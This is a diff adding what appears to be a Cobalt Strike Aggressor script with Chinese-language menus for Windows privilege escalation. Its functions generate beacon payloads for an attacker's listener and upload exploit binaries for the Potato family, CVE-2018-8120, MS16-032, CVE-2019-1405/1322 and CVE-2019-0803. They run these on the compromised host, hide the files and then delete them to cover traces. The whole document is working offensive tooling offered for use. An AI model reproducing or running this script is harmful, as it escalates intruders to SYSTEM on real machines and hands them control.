@@ -1,0 +1,234 @@
+#define functions
+
+
+sub RunJuicyPotato{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via JuicyPotato");
+    local('$payload $handle $call $port $id $fname');
+    $call = $3['Call'];
+    $port = $3['Port'];
+    $id = $3['CLSID'];
+    $fname = Getname().".cmd";
+    if ($call eq "CreateProcessWithTokenW"){
+        $call = "t";
+    }
+    else if($call eq "CreateProcessAsUser"){
+        $call = "u";
+    }
+    else{
+        $call = "\*";
+    }
+    if( !-isnumber $port){
+        show_error("The port is not regular. Please enter the number in the range of 1-65535 !");
+        return;
+    }
+    if(($port < 1) || ($port > 65535)){
+        show_error("Port out of range !");
+        return;
+    }
+    $payload = powershell($3['listener'], false);
+    $handle = openf("> $+ $fname");
+    writeb($handle, $payload);
+    closef($handle);
+    bupload!($bid, script_resource("exp/jp/jp.exe"));
+    bupload!($bid, $fname);
+    bshell!($bid,"jp.exe -t  $+ $call -l  $+ $port -p  $+ $fname");
+    exec("cmd.exe /C del /F ".$fname);
+}
+
+sub BadPotato{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via BadPotato");
+    local('$payload $handle $fname');
+    $fname = Getname().".cmd";
+    $payload = powershell($3['listener'], false);
+    $handle = openf("> $+ $fname");
+    writeb($handle, $payload);
+    closef($handle);
+    bupload!($bid, $fname);
+    bexecute_assembly($bid, script_resource("post/BadPotato.exe"), $fname);
+}
+
+sub CVE_2018_8120{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2018-8120");
+    local('$Rch $payload');
+    $Rch = "x86";
+    if (beacon_info($bid,"is64") == 1){
+        $Rch = "x64";
+    }
+    $payload = powershell($3['listener'], false, $Rch);
+    bupload!($bid, script_resource("exp/8120/ $+ $Rch $+ .exe"));
+    bshell!($bid, "attrib \"$Rch $+ .exe\" +s +h");
+    bshell!($bid,"$Rch $+ .exe \"".$payload."\"");
+    bshell!($bid,"taskkill /f /im $Rch $+ .exe");
+    bshell!($bid,"del /F /S /Q /AH $Rch $+ .exe");
+}
+
+sub ms16032{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via ms16-032");
+    local('$Rch $payload $fname');
+    @array = @("a", "b", "c", "d", "e", "f", "g", "1", "2", "3", "4", "5", "6");
+    $total = 8;
+    while($total >= 0){
+        $fname = $fname.rand(@array);
+        $total = $total - 1;
+    }
+    $fname = $fname.".cmd";
+    $Rch = "x86";
+    if (beacon_info($bid,"is64") == 1){
+        $Rch = "x64";
+    }
+    $payload = powershell($3['listener'], false, $Rch);
+    $handle = openf("> $+ $fname");
+    writeb($handle, $payload);
+    closef($handle);
+    bupload!($bid, $fname);
+    bshell!($bid, "attrib \" $+ $fname\" +s +h");
+    bpowershell_import!($bid, script_resource("script/MS16-032.ps1"));
+	bpowershell!($bid, "Invoke-MS16-032  $+ $fname");
+    exec("cmd.exe /C del /F ".$fname);
+}
+
+sub RottenPotato{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via RottenPotato (ms16-075)");
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $dll = "x64.dll";
+    } else {
+        $arch = "x86";
+        $dll = "x86.dll";
+    }
+    $stager = shellcode($3['listener'], false, $arch);
+    bdllspawn($bid, script_resource("exp/16075/".$dll), $stager, "NTLM DCOM->RPC NTLM Reflection (MS16-075)", 5000);
+    beacon_link($bid, $null, $3['listener']);
+}
+
+
+sub CVE_2019_1405_1322{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2019-1405(1322)");
+    local('$Rch $payload');
+    $Rch = "x64";
+    if (beacon_info($bid,"is64") != 1){
+        show_error("The target is not a x64 machine !");
+        return;
+    }
+    $payload = powershell($3['listener'], false, $Rch);
+    bupload!($bid, script_resource("exp/com/1405_1322_x64.exe"));
+    bshell!($bid, "attrib \"1405_1322_x64.exe\" +s +h");
+    bshell!($bid,"1405_1322_x64.exe \"".$payload."\"");
+    bshell!($bid,"del /F /S /Q /AH 1405_1322_x64.exe");
+}
+
+sub SweetPotato {
+	local('$shellcode $arch $program $exe $parm');
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via SweetPotato (ms16-075)", "T1068");
+    if (-is64 $bid)
+    {
+        $arch = "x64";
+	} else {
+        $arch = "x86";
+	}
+	$program = "c:\\windows\\system32\\werfault.exe";
+	$exe = script_resource("exp/sp/sp.exe");
+	$shellcode = base64_encode(artifact_payload($3['listener'], "raw", $arch));
+	$parm = "-l 6363 "."-p $program "."-s $shellcode";
+    bexecute_assembly!($bid, $exe, $parm);
+	beacon_link($bid, $null, $3['listener']);
+}
+
+sub cve_2019_0803{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via cve-2019-0803");
+    local('$payload $fname');
+    $fname = Getname().".cmd";
+    $payload = powershell($3['listener'], false);
+    $handle = openf("> $+ $fname");
+    writeb($handle, $payload);
+    closef($handle);
+    bupload!($bid, script_resource("exp/0803.exe"));
+    bupload!($bid, $fname);
+    bshell!($bid,"0803.exe cmd  $+ \"$fname\"");
+}
+#append menus
+
+
+
+    menu "本地提权"{
+
+        menu "土豆系列(MS16-075)"{
+
+            item "烂土豆"{
+                $bid = $1['@'];
+                $Dialog = dialog("烂土豆",%(bid => $bid),&RottenPotato);
+                dialog_description($Dialog, "该漏洞可用于权限提升");
+                drow_listener($Dialog, "listener", "监听器: ");
+                dbutton_action($Dialog, "利用");
+                dialog_show($Dialog);
+            }
+
+            item "多汁土豆"{
+                $bid = $1['@'];
+                $Dialog = dialog("多汁土豆",%(Call =>"Both", Port => "1337", CLSID => "{4991d34b-80a1-4291-83b6-3328366b9097}", bid => $bid),&RunJuicyPotato);
+                dialog_description($Dialog, "烂土豆的改进版本，可从Windows服务账户提权至NT AUTHORITY\\SYSTEM");
+                drow_listener($Dialog, "listener", "监听器: ");
+                drow_combobox($Dialog, "Call",  "创建进程调用: ", @("CreateProcessWithTokenW","CreateProcessAsUser","Both"));
+                drow_text($Dialog, "Port", "监听端口: ");
+                drow_text($Dialog, "CLSID", "CLSID: ");
+                dbutton_action($Dialog, "利用");
+                dialog_show($Dialog);
+            }
+
+            item "甜土豆"{
+                $bid = $1['@'];
+                $Dialog = dialog("甜土豆",%(bid => $bid),&SweetPotato);
+                dialog_description($Dialog, "该漏洞可用于权限提升");
+                drow_listener($Dialog, "listener", "监听器: ");
+                dbutton_action($Dialog, "利用");
+                dialog_show($Dialog);
+            }
+            item "坏土豆"{
+                $bid = $1['@'];
+                $Dialog = dialog("坏土豆",%(bid => $bid),&BadPotato);
+                dialog_description($Dialog, "该漏洞可用于权限提升");
+                drow_listener($Dialog, "listener", "监听器: ");
+                dbutton_action($Dialog, "利用");
+                dialog_show($Dialog);
+            }
+
+
+        }
+
+        item "CVE-2018-8120"{
+            $bid = $1['@'];
+            $Dialog = dialog("CVE-2018-8120",%(bid => $bid),&CVE_2018_8120);
+            dialog_description($Dialog, "Win32k组件未能正确处理内存中的对象时的提权漏洞");
+            drow_listener($Dialog, "listener", "监听器: ");
+            dbutton_action($Dialog, "利用");
+            dialog_show($Dialog);
+        }
+
+        item "MS16-032"{
+            $bid = $1['@'];
+            $Dialog = dialog("MS16-032",%(bid => $bid),&ms16032);
+            dialog_description($Dialog, "Windows辅助登录服务未能正确管理内存中的请求句柄时的提权漏洞");
+            drow_listener($Dialog, "listener", "监听器: ");
+            dbutton_action($Dialog, "利用");
+            dialog_show($Dialog);
+        }
+
+        item "CVE-2019-1405 && 1322"{
+            $bid = $1['@'];
+            $Dialog = dialog("CVE-2019-1405/1322",%(bid => $bid),&CVE_2019_1405_1322);
+            dialog_description($Dialog, "Windows不正确处理身份验证请求时存在的提权漏洞");
+            drow_listener($Dialog, "listener", "监听器: ");
+            dbutton_action($Dialog, "利用");
+            dialog_show($Dialog);
+        }
+
+        item "CVE-2019-0803"{
+            $bid = $1['@'];
+            $Dialog = dialog("CVE-2019-0803",%(bid => $bid),&cve_2019_0803);
+            dialog_description($Dialog, "Win32k组件未能正确处理内存中的对象时的提权漏洞");
+            drow_listener($Dialog, "listener", "监听器: ");
+            dbutton_action($Dialog, "利用");
+            dialog_show($Dialog);
+        }
+    }
